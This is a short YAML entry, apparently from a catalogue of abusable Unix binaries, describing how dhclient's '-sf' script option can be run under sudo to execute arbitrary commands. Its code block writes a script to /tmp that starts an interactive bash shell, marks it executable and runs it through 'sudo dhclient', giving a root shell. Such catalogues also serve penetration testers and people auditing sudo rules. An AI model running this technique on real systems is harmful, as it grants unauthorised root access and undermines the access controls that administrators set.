---
functions:
  sudo:
    - description: The below technique utilizies `dhclient`'s script file option (`-sf`) to execute arbitrary commands with `sudo`.
      code: |
        cat > /tmp/script.sh << EOF
        #!/bin/bash
        bash -i
        EOF
        chmod +x /tmp/script.sh
        sudo dhclient -sf /tmp/script.sh
---
